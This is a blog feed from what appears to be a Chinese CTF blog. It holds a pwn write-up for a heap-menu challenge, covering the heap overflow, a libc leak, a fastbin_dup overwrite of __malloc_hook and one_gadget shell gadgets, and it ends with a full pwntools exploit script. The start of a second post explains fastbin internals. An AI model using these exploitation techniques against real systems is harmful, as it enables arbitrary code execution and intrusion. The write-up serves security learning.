(!<span class="built_in">list</span>[i*<span class="number">24</span>])&#123;</div><div class="line">            <span class="built_in">printf</span>(<span class="string">"Size: "</span>);</div><div class="line">            n = read_int();</div><div class="line">            <span class="keyword">if</span>(n &gt; <span class="number">0</span>)</div><div class="line">            &#123;</div><div class="line">                <span class="keyword">if</span> (n &gt; <span class="number">4096</span>)</div><div class="line">                    n = <span class="number">4096</span>;</div><div class="line">                add = <span class="built_in">calloc</span>(n, <span class="number">1</span>);</div><div class="line">                <span class="keyword">if</span> (!add)</div><div class="line">                    <span class="built_in">exit</span>(<span class="number">-1</span>);</div><div class="line">                <span class="built_in">list</span>[<span class="number">24</span>*i] = <span class="number">1</span>;</div><div class="line">                <span class="built_in">list</span>[<span class="number">24</span>*i + <span class="number">8</span>] = n;</div><div class="line">                <span class="built_in">list</span>[<span class="number">24</span>*i + <span class="number">16</span>] = add;</div><div class="line">                <span class="built_in">printf</span>(<span class="string">"Allocate Index %d\n"</span>, i);</div><div class="line">            &#125;</div><div class="line">            <span class="keyword">return</span>;</div><div class="line">        &#125;</div><div class="line">    &#125; </div><div class="line">&#125;</div><div class="line"></div><div class="line"><span class="function"><span class="keyword">long</span> <span class="title">fill_data</span><span class="params">(<span class="keyword">long</span> index, <span class="keyword">long</span> len)</span></span></div><div class="line">&#123;</div><div class="line">    <span class="keyword">long</span> n, m, r;</div><div class="line">    <span class="keyword">if</span>(len)&#123;</div><div class="line">        n = <span class="number">0</span>;</div><div class="line">        <span class="keyword">while</span> (n &lt; len)&#123;</div><div class="line">            m = read(<span class="number">0</span>, <span class="built_in">list</span>[index*<span class="number">24</span>+<span class="number">16</span>], len-n);</div><div class="line">            <span class="keyword">if</span> (m &gt; <span class="number">0</span>)</div><div class="line">                n += m;</div><div class="line">            <span class="keyword">else</span></div><div class="line">                <span class="keyword">break</span>;</div><div class="line">        &#125;</div><div class="line">        r = n;</div><div class="line">    &#125;</div><div class="line">    <span class="keyword">else</span></div><div class="line">        r = <span class="number">0</span>;</div><div class="line">    <span class="keyword">return</span> r;</div><div class="line">&#125;</div><div class="line"></div><div class="line"><span class="function"><span class="keyword">void</span> <span class="title">fill_chunk</span><span class="params">()</span></span></div><div class="line">&#123;</div><div class="line">    <span class="keyword">long</span> result, index;</div><div class="line">    <span class="built_in">printf</span>(<span class="string">"Index: "</span>);</div><div class="line">    result = read_int();</div><div class="line">    index = result;</div><div class="line">    <span class="keyword">if</span> ((result &amp; <span class="number">0x80000000</span>) == <span class="number">0</span> &amp;&amp; result &lt;= <span class="number">15</span>)</div><div class="line">    &#123;</div><div class="line">        result = <span class="built_in">list</span>[result*<span class="number">24</span>];</div><div class="line">        <span class="keyword">if</span> (result == <span class="number">1</span>)&#123;</div><div class="line">            <span class="built_in">printf</span>(<span class="string">"Size: "</span>);</div><div class="line">            result = read_int();</div><div class="line">            <span class="keyword">if</span> (result &gt; <span class="number">0</span>)&#123;</div><div class="line">                <span class="built_in">printf</span>(<span class="string">"Content: "</span>);</div><div class="line">                result = fill_data(index, result);</div><div class="line">            &#125;</div><div class="line">        &#125;</div><div class="line">    &#125;</div><div class="line">    <span class="keyword">return</span>;</div><div class="line">&#125;</div><div class="line"></div><div class="line"><span class="function"><span class="keyword">void</span> <span class="title">free_chunk</span><span class="params">()</span></span></div><div class="line">&#123;</div><div class="line">    <span class="keyword">long</span> r, index;</div><div class="line">    <span class="built_in">printf</span>(<span class="string">"Index: "</span>);</div><div class="line">    r = read_int();</div><div class="line">    index = r;</div><div class="line">    <span class="keyword">if</span> (r &gt;= <span class="number">0</span> &amp;&amp; r &lt;= <span class="number">15</span>)&#123;</div><div class="line">        r = <span class="built_in">list</span>[index*<span class="number">24</span>];</div><div class="line">        <span class="keyword">if</span> (r == <span class="number">1</span>)&#123;</div><div class="line">            <span class="built_in">list</span>[index*<span class="number">24</span>] = <span class="number">0</span>;</div><div class="line">            <span class="built_in">list</span>[index*<span class="number">24</span>+<span class="number">8</span>] = <span class="number">0</span>;</div><div class="line">            <span class="built_in">free</span>(<span class="built_in">list</span>[index*<span class="number">24</span>+<span class="number">16</span>]);</div><div class="line">            <span class="built_in">list</span>[index*<span class="number">24</span>+<span class="number">16</span>] = <span class="number">0</span>;</div><div class="line">        &#125;</div><div class="line">    &#125;</div><div class="line">    <span class="keyword">return</span>;</div><div class="line">&#125;</div><div class="line"></div><div class="line"><span class="function"><span class="keyword">long</span> <span class="title">write_data</span><span class="params">(<span class="keyword">long</span> addr, <span class="keyword">long</span> len)</span></span></div><div class="line">&#123;</div><div class="line">    <span class="keyword">unsigned</span> <span class="keyword">long</span> n;</div><div class="line">    <span class="keyword">int</span> s;</div><div class="line">    n = <span class="number">0</span>;</div><div class="line">    <span class="keyword">while</span>(n &lt; len)</div><div class="line">    &#123;</div><div class="line">        s = write(<span class="number">1</span>, addr+n, len-n);</div><div class="line">        <span class="keyword">if</span> (s &gt; <span class="number">0</span>)</div><div class="line">        &#123;</div><div class="line">            n += s;</div><div class="line">        &#125;</div><div class="line">        <span class="keyword">else</span></div><div class="line">            <span class="keyword">break</span>;</div><div class="line">    &#125;</div><div class="line">    <span class="keyword">return</span> n;</div><div class="line">&#125;</div><div class="line"></div><div class="line"><span class="function"><span class="keyword">void</span> <span class="title">dump_chunk</span><span class="params">()</span></span></div><div class="line">&#123;</div><div class="line">    <span class="keyword">long</span> r, index;</div><div class="line">    <span class="built_in">printf</span>(<span class="string">"Index: "</span>);</div><div class="line">    r = read_int();</div><div class="line">    index = r;</div><div class="line">    <span class="keyword">if</span> (r &gt;=<span class="number">0</span> &amp;&amp; r &lt;=<span class="number">15</span>)</div><div class="line">    &#123;</div><div class="line">        r = <span class="built_in">list</span>[index*<span class="number">24</span>];</div><div class="line">        <span class="keyword">if</span> (r == <span class="number">1</span>)</div><div class="line">        &#123;</div><div class="line">            <span class="built_in">puts</span>(<span class="string">"Content: "</span>);</div><div class="line">            write_data(<span class="built_in">list</span>[index*<span class="number">24</span>+<span class="number">16</span>], <span class="built_in">list</span>[index*<span class="number">24</span>+<span class="number">8</span>]);</div><div class="line">            <span class="built_in">puts</span>(<span class="string">""</span>);</div><div class="line">        &#125;</div><div class="line">    &#125;</div><div class="line">&#125;</div><div class="line"></div><div class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">void</span>)</span></span></div><div class="line">&#123;</div><div class="line">    <span class="keyword">unsigned</span> <span class="keyword">long</span> n;</div><div class="line">    setbuf(<span class="built_in">stdin</span>, <span class="number">0</span>);</div><div class="line">    setbuf(<span class="built_in">stdout</span>, <span class="number">0</span>);</div><div class="line">    <span class="keyword">for</span>(;;)&#123;</div><div class="line">        menu();</div><div class="line">        n = read_int();</div><div class="line">        <span class="keyword">switch</span>(n)&#123;</div><div class="line">            <span class="keyword">case</span> <span class="number">1</span>: alloca_chunk(); <span class="keyword">break</span>;</div><div class="line">            <span class="keyword">case</span> <span class="number">2</span>: fill_chunk(); <span class="keyword">break</span>;</div><div class="line">            <span class="keyword">case</span> <span class="number">3</span>: free_chunk(); <span class="keyword">break</span>;</div><div class="line">            <span class="keyword">case</span> <span class="number">4</span>: dump_chunk(); <span class="keyword">break</span>;</div><div class="line">            <span class="keyword">case</span> <span class="number">5</span>: <span class="keyword">return</span> <span class="number">0</span>;</div><div class="line">        &#125;</div><div class="line">    &#125;</div><div class="line">&#125;</div></pre></td></tr></table></figure>
<p>我还原的代码和bin差别还是挺多的，但是4个函数的逻辑基本相同，还原这个代码只是为了方便我调试，所以并不开PIE，然后调试的时候当做我开了😏</p>
<p>我总结了下，这题已经可以分为三个姿势</p>
<p>PS: calloc和malloc是差不多的，区别很小，具体的自行google</p>
<h2 id="leak-libc-address"><a href="#leak-libc-address" class="headerlink" title="leak libc address"></a>leak libc address</h2><p>第一步基本都是想着泄露地址，这题利用堆有一个泄露libc地址的姿势</p>
<p>首先，先简单的说，一个small bin，它的fd和bk会指向top chunk(剩下的small bin, large bin, unsortbin还有一个remainder我之后应该也会写blog)，指向的不是top chunk的地址，而是指向top chunk指针，再详细点就是，在arena中有一个地方存放的是top chunk的地址，在fastbin之后remainder之前(上一篇讲fastbin的应该有提及到)，而fd和bk就是会指向这个地址，而arena是位于libc的<code>.data</code>区域，所以arena的地址也就是libc的地址，而我们有了libc库，所以也能算出其他地址。</p>
<p>在这之前，还得解决一个问题，就是怎么输出fd或者是bk，当free了之后就没法dump了。所以这里就得利用到之前提到的<code>fatbin_dup</code>了</p>
<p>现在就来详细的说下，首先，malloc出下面这样的堆空间</p>
<table>
<thead>
<tr>
<th style="text-align:center">地址</th>
<th style="text-align:center">0-8 byte</th>
<th style="text-align:center">9-f byte</th>
</tr>
</thead>
<tbody>
<tr>
<td style="text-align:center">id:0/0x00</td>
<td style="text-align:center">0</td>
<td style="text-align:center">0x21</td>
</tr>
<tr>
<td style="text-align:center">0x10</td>
<td style="text-align:center">0</td>
<td style="text-align:center">0</td>
</tr>
<tr>
<td style="text-align:center">id:1/0x20</td>
<td style="text-align:center">0</td>
<td style="text-align:center">0x21</td>
</tr>
<tr>
<td style="text-align:center">0x30</td>
<td style="text-align:center">0</td>
<td style="text-align:center">0</td>
</tr>
<tr>
<td style="text-align:center">id:2/0x40</td>
<td style="text-align:center">0</td>
<td style="text-align:center">0x21</td>
</tr>
<tr>
<td style="text-align:center">0x50</td>
<td style="text-align:center">0</td>
<td style="text-align:center">0</td>
</tr>
<tr>
<td style="text-align:center">id:3/0x60</td>
<td style="text-align:center">0</td>
<td style="text-align:center">0x91</td>
</tr>
<tr>
<td style="text-align:center">0x70</td>
<td style="text-align:center">0</td>
<td style="text-align:center">0</td>
</tr>
<tr>
<td style="text-align:center">id:4/0xf0</td>
<td style="text-align:center">0</td>
<td style="text-align:center">0x91</td>
</tr>
</tbody>
</table>
<p>首先是malloc出3个fast chunk和两个small chuank，small chunk这里malloc出两个是因为如果free的small chunk下面是top chunk，则触发unlink合并机制，也就没有啥fd和bk了，所以malloc出两个，然后free第一个</p>
<p>这里还有一个问题，上面表中的地址我可不是乱写的，因为要页对齐的原因，我们虽然不知道malloc的具体地址空间，但是我们却能知道最后一个byte的值就是我上面标的这样的</p>
<p>第一步我们先free(2)，然后我们再free(1)，这个时候的堆是这样的：</p>
<table>
<thead>
<tr>
<th style="text-align:center">地址</th>
<th style="text-align:center">0-8 byte</th>
<th style="text-align:center">9-f byte</th>
</tr>
</thead>
<tbody>
<tr>
<td style="text-align:center">id:0/0x00</td>
<td style="text-align:center">0</td>
<td style="text-align:center">0x21</td>
</tr>
<tr>
<td style="text-align:center">0x10</td>
<td style="text-align:center">0</td>
<td style="text-align:center">0</td>
</tr>
<tr>
<td style="text-align:center">0x20</td>
<td style="text-align:center">0</td>
<td style="text-align:center">0x21</td>
</tr>
<tr>
<td style="text-align:center">0x30</td>
<td style="text-align:center">0x40</td>
<td style="text-align:center">0</td>
</tr>
<tr>
<td style="text-align:center">0x40</td>
<td style="text-align:center">0</td>
<td style="text-align:center">0x21</td>
</tr>
<tr>
<td style="text-align:center">0x50</td>
<td style="text-align:center">0</td>
<td style="text-align:center">0</td>
</tr>
</tbody>
</table>
<p>然后在bin中有一处很明显的漏洞，fill函数中输入的数据长度是在fill函数中由你输入的，而不是你malloc的长度，所以这里就存在堆溢出，比如我malloc(0x10)，但是我fill却可以输入0x30的数据。</p>
<p>利用这个方法，我们可以通过fill(0)，从而修改0x30地址的第一个byte，修改成0x60，payload:</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">payload = p64(<span class="number">0</span>)*<span class="number">3</span></div><div class="line">payload += p64(<span class="number">0x21</span>)</div><div class="line">payload += p8(<span class="number">0x60</span>)</div></pre></td></tr></table></figure>
<p>这样我们再malloc(0x10)，获取到了0x20，再次malloc(0x10)，并不能获得到0x60，讲fastbin的时候讲过，malloc有check机制，会check长度，因为0x60的长度是0x90，所以会失败。</p>
<p>解决方案也很简单，在free(2)之前，我们先fill(2)，修改成0x21，payload:</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">payload = p64(<span class="number">0</span>)*<span class="number">3</span></div><div class="line">payload += p64(<span class="number">0x21</span>)</div></pre></td></tr></table></figure>
<p>这个时候的堆是这样的：</p>
<table>
<thead>
<tr>
<th style="text-align:center">地址</th>
<th style="text-align:center">0-8 byte</th>
<th style="text-align:center">9-f byte</th>
</tr>
</thead>
<tbody>
<tr>
<td style="text-align:center">id:0/0x00</td>
<td style="text-align:center">0</td>
<td style="text-align:center">0x21</td>
</tr>
<tr>
<td style="text-align:center">0x10</td>
<td style="text-align:center">0</td>
<td style="text-align:center">0</td>
</tr>
<tr>
<td style="text-align:center">id:1/0x20</td>
<td style="text-align:center">0</td>
<td style="text-align:center">0x21</td>
</tr>
<tr>
<td style="text-align:center">0x30</td>
<td style="text-align:center">0</td>
<td style="text-align:center">0</td>
</tr>
<tr>
<td style="text-align:center">0x40</td>
<td style="text-align:center">0</td>
<td style="text-align:center">0x21</td>
</tr>
<tr>
<td style="text-align:center">0x50</td>
<td style="text-align:center">0</td>
<td style="text-align:center">0</td>
</tr>
<tr>
<td style="text-align:center">id:3/id:2/0x60</td>
<td style="text-align:center">0</td>
<td style="text-align:center">0x21</td>
</tr>
</tbody>
</table>
<p>然后fill(1)，payload:</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line">payload = p64(<span class="number">0</span>)*<span class="number">3</span></div><div class="line">payload += p64(<span class="number">0x21</span>)</div><div class="line">payload += p64(<span class="number">0</span>)*<span class="number">3</span></div><div class="line">payload += p64(<span class="number">0x91</span>)</div></pre></td></tr></table></figure>
<p>来修复small chunk的size</p>
<p>这时候就能成功的free(3)</p>
<p>这个时候的堆：</p>
<table>
<thead>
<tr>
<th style="text-align:center">地址</th>
<th style="text-align:center">0-8 byte</th>
<th style="text-align:center">9-f byte</th>
</tr>
</thead>
<tbody>
<tr>
<td style="text-align:center">id:0/0x00</td>
<td style="text-align:center">0</td>
<td style="text-align:center">0x21</td>
</tr>
<tr>
<td style="text-align:center">0x10</td>
<td style="text-align:center">0</td>
<td style="text-align:center">0</td>
</tr>
<tr>
<td style="text-align:center">id:1/0x20</td>
<td style="text-align:center">0</td>
<td style="text-align:center">0x21</td>
</tr>
<tr>
<td style="text-align:center">0x30</td>
<td style="text-align:center">0</td>
<td style="text-align:center">0</td>
</tr>
<tr>
<td style="text-align:center">0x40</td>
<td style="text-align:center">0</td>
<td style="text-align:center">0x21</td>
</tr>
<tr>
<td style="text-align:center">0x50</td>
<td style="text-align:center">0</td>
<td style="text-align:center">0</td>
</tr>
<tr>
<td style="text-align:center">id:2/0x60</td>
<td style="text-align:center">0</td>
<td style="text-align:center">0x91</td>
</tr>
<tr>
<td style="text-align:center">0x70</td>
<td style="text-align:center">fd(*top_chunk)</td>
<td style="text-align:center">bk(*top_chunk)</td>
</tr>
</tbody>
</table>
<p>然后我们再dump(2)，就能获取到libc的地址了</p>
<h2 id="malloc-hook"><a href="#malloc-hook" class="headerlink" title="malloc hook"></a>malloc hook</h2><p>这对我来说也是一个新的知识点</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div></pre></td><td class="code"><pre><div class="line">pwndbg&gt; x/36gx 0x7ffff7dd1b20-0x40</div><div class="line">0x7ffff7dd1ae0 &lt;_IO_wide_data_0+288&gt;:	0x0000000000000000	0x0000000000000000</div><div class="line">0x7ffff7dd1af0 &lt;_IO_wide_data_0+304&gt;:	0x00007ffff7dd0260	0x0000000000000000</div><div class="line">0x7ffff7dd1b00 &lt;__memalign_hook&gt;:	0x00007ffff7a92e20	0x00007ffff7a92a00</div><div class="line">0x7ffff7dd1b10 &lt;__malloc_hook&gt;:	0x0000000000000000	0x0000000000000000</div><div class="line">0x7ffff7dd1b20 &lt;main_arena&gt;:	0x0000000100000000	0x0000000000000000</div><div class="line">0x7ffff7dd1b30 &lt;main_arena+16&gt;:	0x0000000000000000	0x0000000000000000</div></pre></td></tr></table></figure>
<p>在arena的上面，有个malloc_hook，当这个地址的值不为0时，我们执行malloc将会先跳到malloc_hook的地址上执行指令</p>
<p>所以这里就有一个思路了，我们把malloc_hook给赋值一个执行shell指令的地址，该地址假设为0x23333</p>
<p>然后我们执行malloc函数，不就可以拿到shell了么</p>
<p>覆盖malloc_hook倒挺简单的，就是通过上面的fastbin_dup方法，malloc出最大是malloc_hook-0x16的地址，然后通过fill来覆盖malloc_hook</p>
<p>这里的唯一问题就是malloc的长度检查，然后fastbin的size范围是0x20-0x80</p>
<p>这个问题也好解决，我们可以看看上面的数据，储存了一些地址，而这些地址的高位都是0x7f，所以我们可以修改偏移，这样:</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div></pre></td><td class="code"><pre><div class="line">pwndbg&gt; x/10gx 0x7ffff7dd1b20-0x33</div><div class="line">0x7ffff7dd1aed &lt;_IO_wide_data_0+301&gt;:	0xfff7dd0260000000	0x000000000000007f</div><div class="line">0x7ffff7dd1afd:	                        0xfff7a92e20000000	0xfff7a92a0000007f</div><div class="line">0x7ffff7dd1b0d &lt;__realloc_hook+5&gt;:	    0x000000000000007f	0x0000000000000000</div><div class="line">0x7ffff7dd1b1d:	                        0x0100000000000000	0x0000000000000000</div><div class="line">0x7ffff7dd1b2d &lt;main_arena+13&gt;:	        0x0000000000000000	0x0000000000000000</div></pre></td></tr></table></figure>
<p>这样，就成功构造了一个有效size</p>
<p>然后我们利用fastbin_dup，达到malloc(0x60)返回改地址的目的，然后把malloc_hook的地址覆盖成0x23333就好了</p>
<p>上面的利用过程我们不需要知道具体的地址，我们只需要知道这个地址和我们之前泄露出来的地址之前的差值就能计算出来该地址了</p>
<h2 id="寻找getshell指令"><a href="#寻找getshell指令" class="headerlink" title="寻找getshell指令"></a>寻找getshell指令</h2><p>我看了别人的wp，发现使用一个<a href="https://github.com/david942j/one_gadget" target="_blank" rel="external">one_gadget</a>工具</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div></pre></td><td class="code"><pre><div class="line"><span class="meta">$</span><span class="bash"> one_gadget libc.so.6 </span></div><div class="line">0x41374	execve("/bin/sh", rsp+0x30, environ)</div><div class="line">constraints:</div><div class="line">  [rsp+0x30] == NULL</div><div class="line"></div><div class="line">0xbac7d	execve("/bin/sh", rsi, r12)</div><div class="line">constraints:</div><div class="line">  [rsi] == NULL || rsi == NULL</div><div class="line">  [r12] == NULL || r12 == NULL</div><div class="line"></div><div class="line">0xbaccc	execve("/bin/sh", [rbp-0x48], r12)</div><div class="line">constraints:</div><div class="line">  [[rbp-0x48]] == NULL || [rbp-0x48] == NULL</div><div class="line">  [r12] == NULL || r12 == NULL</div><div class="line"></div><div class="line">0xd6e77	execve("/bin/sh", rsp+0x70, environ)</div><div class="line">constraints:</div><div class="line">  [rsp+0x70] == NULL</div><div class="line"></div><div class="line">0xdaa50	execve("/bin/sh", r9, rdx)</div><div class="line">constraints:</div><div class="line">  [r9] == NULL || r9 == NULL</div><div class="line">  [rdx] == NULL || rdx == NULL</div></pre></td></tr></table></figure>
<p>可以找到好几个能getshell的指令</p>
<p>T：那么以前做栈溢出的时候是不是泄露出libc地址后可以直接跳到这个地址了，就不用再自己构造system(‘/bin/sh’)了？下次去试试</p>
<hr>
<p>感觉自己从来就不会Pwn……继续努力学习新姿势</p>
<p>最后附上PoC:</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div><div class="line">51</div><div class="line">52</div><div class="line">53</div><div class="line">54</div><div class="line">55</div><div class="line">56</div><div class="line">57</div><div class="line">58</div><div class="line">59</div><div class="line">60</div><div class="line">61</div><div class="line">62</div><div class="line">63</div><div class="line">64</div><div class="line">65</div><div class="line">66</div><div class="line">67</div><div class="line">68</div><div class="line">69</div><div class="line">70</div><div class="line">71</div><div class="line">72</div><div class="line">73</div><div class="line">74</div><div class="line">75</div><div class="line">76</div><div class="line">77</div><div class="line">78</div><div class="line">79</div><div class="line">80</div><div class="line">81</div><div class="line">82</div><div class="line">83</div><div class="line">84</div></pre></td><td class="code"><pre><div class="line"><span class="comment">#!/usr/bin/env python</span></div><div class="line"><span class="comment"># -*- coding=utf-8 -*-</span></div><div class="line"></div><div class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</div><div class="line"></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">alloc</span><span class="params">(size)</span>:</span></div><div class="line">    r.sendline(<span class="string">'1'</span>)</div><div class="line">    r.sendlineafter(<span class="string">': '</span>, str(size))</div><div class="line">    r.recvuntil(<span class="string">': '</span>, timeout=<span class="number">5</span>)</div><div class="line"></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">fill</span><span class="params">(idx, data)</span>:</span></div><div class="line">    r.sendline(<span class="string">'2'</span>)</div><div class="line">    r.sendlineafter(<span class="string">': '</span>, str(idx))</div><div class="line">    r.sendlineafter(<span class="string">': '</span>, str(len(data)))</div><div class="line">    r.sendafter(<span class="string">': '</span>, data)</div><div class="line">    r.recvuntil(<span class="string">': '</span>)</div><div class="line"></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">free</span><span class="params">(idx)</span>:</span></div><div class="line">    r.sendline(<span class="string">'3'</span>)</div><div class="line">    r.sendlineafter(<span class="string">': '</span>, str(idx))</div><div class="line">    r.recvuntil(<span class="string">': '</span>)</div><div class="line"></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">dump</span><span class="params">(idx)</span>:</span></div><div class="line">    r.sendline(<span class="string">'4'</span>)</div><div class="line">    r.sendlineafter(<span class="string">': '</span>, str(idx))</div><div class="line">    r.recvuntil(<span class="string">': \n'</span>)</div><div class="line">    data = r.recvline()</div><div class="line">    r.recvuntil(<span class="string">': '</span>)</div><div class="line">    <span class="keyword">return</span> data</div><div class="line"></div><div class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</div><div class="line">    debug = <span class="number">1</span></div><div class="line"></div><div class="line">    <span class="keyword">if</span> debug:</div><div class="line">        context.log_level = <span class="string">"debug"</span></div><div class="line">        r = process(<span class="string">"./test"</span>)</div><div class="line">    <span class="keyword">else</span>:</div><div class="line">        r = remote(<span class="string">"127.0.0.1"</span>, <span class="number">10000</span>)</div><div class="line">    r.recvuntil(<span class="string">': '</span>)</div><div class="line"></div><div class="line">    alloc(<span class="number">0x10</span>)</div><div class="line">    alloc(<span class="number">0x10</span>)</div><div class="line">    alloc(<span class="number">0x10</span>)</div><div class="line">    alloc(<span class="number">0x80</span>)</div><div class="line">    alloc(<span class="number">0x80</span>)</div><div class="line"></div><div class="line">    payload  = p64(<span class="number">0</span>)*<span class="number">3</span></div><div class="line">    payload += p64(<span class="number">0x21</span>)</div><div class="line">    fill(<span class="number">2</span>, payload)</div><div class="line"></div><div class="line">    free(<span class="number">2</span>)</div><div class="line">    free(<span class="number">1</span>)</div><div class="line"></div><div class="line">    payload  = p64(<span class="number">0</span>)*<span class="number">3</span></div><div class="line">    payload += p64(<span class="number">0x21</span>)</div><div class="line">    payload += p8(<span class="number">0x60</span>)</div><div class="line">    fill(<span class="number">0</span>, payload)</div><div class="line"></div><div class="line">    alloc(<span class="number">0x10</span>)</div><div class="line">    alloc(<span class="number">0x10</span>)</div><div class="line"></div><div class="line">    payload  = p64(<span class="number">0</span>)*<span class="number">7</span></div><div class="line">    payload += p64(<span class="number">0x91</span>)</div><div class="line">    fill(<span class="number">1</span>, payload)</div><div class="line">    free(<span class="number">3</span>)</div><div class="line"></div><div class="line">    arena_top = u64(dump(<span class="number">2</span>)[:<span class="number">8</span>])</div><div class="line">    log.info(<span class="string">"arena_top_chunk: "</span> + hex(arena_top))</div><div class="line"></div><div class="line">    alloc(<span class="number">0x60</span>)</div><div class="line">    free(<span class="number">3</span>)</div><div class="line"></div><div class="line">    fill(<span class="number">2</span>, p64(arena_top - <span class="number">139</span>))    <span class="comment"># malloc_hook上面的地址</span></div><div class="line">    alloc(<span class="number">0x60</span>)</div><div class="line">    alloc(<span class="number">0x60</span>)</div><div class="line"></div><div class="line">    payload  = <span class="string">'\x00'</span>*<span class="number">3</span></div><div class="line">    payload += p64(<span class="number">0</span>)*<span class="number">2</span></div><div class="line">    payload += p64(arena_top - <span class="number">3556100</span>)  <span class="comment"># getshell的地址</span></div><div class="line">    fill(<span class="number">5</span>, payload)</div><div class="line"></div><div class="line">    alloc(<span class="number">233</span>)</div><div class="line"></div><div class="line">    r.interactive()</div></pre></td></tr></table></figure>
]]></content:encoded>
      
      <comments>http://0x48.pw/2017/08/01/0x36/#disqus_thread</comments>
    </item>
    
    <item>
      <title>glibc malloc学习笔记之fastbin🐦</title>
      <link>http://0x48.pw/2017/07/25/0x35/</link>
      <guid>http://0x48.pw/2017/07/25/0x35/</guid>
      <pubDate>Mon, 24 Jul 2017 16:25:59 GMT</pubDate>
      <description>
      
        &lt;p&gt;fastbin相关的堆知识我一年前就学过了，但是都没写啥记录文档，又咸鱼了好长一段时间，要捡回来这块的知识，又重新开始学习了一遍，这篇博文中记录下我对fastbin的个人理解。&lt;/p&gt;
      
      </description>
      
      <content:encoded><![CDATA[<p>fastbin相关的堆知识我一年前就学过了，但是都没写啥记录文档，又咸鱼了好长一段时间，要捡回来这块的知识，又重新开始学习了一遍，这篇博文中记录下我对fastbin的个人理解。</p>
<a id="more"></a>
<h1 id="基础知识研究"><a href="#基础知识研究" class="headerlink" title="基础知识研究"></a>基础知识研究</h1><p>当使用malloc函数第一次向系统申请小于128kb的内存时，会通过sys_brk申请132kb的内存，这块内存就称为堆。</p>
<p>写个测试代码，对着测试代码进行分析(64位系统)：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div></pre></td><td class="code"><pre><div class="line"><span class="meta"># test.c</span></div><div class="line"><span class="meta"># gcc test.c -o test</span></div><div class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></div><div class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></div><div class="line"></div><div class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">void</span>)</span></span></div><div class="line">&#123;</div><div class="line">	<span class="keyword">char</span> *q;</div><div class="line">	<span class="keyword">char</span> *p;</div><div class="line">	<span class="keyword">int</span> x;</div><div class="line">	<span class="keyword">char</span> input[<span class="number">3</span>];</div><div class="line"></div><div class="line">	<span class="keyword">while</span>(<span class="number">1</span>) &#123;</div><div class="line">		read(<span class="number">0</span>,input,<span class="number">3</span>);</div><div class="line">		x = atoi(input);</div><div class="line">		q = (<span class="keyword">char</span> *)<span class="built_in">malloc</span>(x);</div><div class="line">		read(<span class="number">0</span>,input,<span class="number">3</span>);</div><div class="line">		x = atoi(input);</div><div class="line">		p = (<span class="keyword">char</span> *)<span class="built_in">malloc</span>(x);</div><div class="line">		<span class="built_in">free</span>(q);</div><div class="line">		<span class="built_in">free</span>(p);</div><div class="line">	&#125;</div><div class="line">	<span class="keyword">return</span> <span class="number">0</span>;</div><div class="line">&#125;</div></pre></td></tr></table></figure>
<p>然后使用gdb进行调试(使用peda和libheap插件，这两个都可以在github上搜到)，当第一次调用malloc(0x10)之后，查看内存信息：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line">gdb-peda$ vmmap</div><div class="line">....</div><div class="line">0x00602000         0x00623000         rw-p	[heap]</div><div class="line">....</div></pre></td></tr></table></figure>
<p>可以看到堆的大小为132kb</p>
<p>先来说下基础概念：</p>
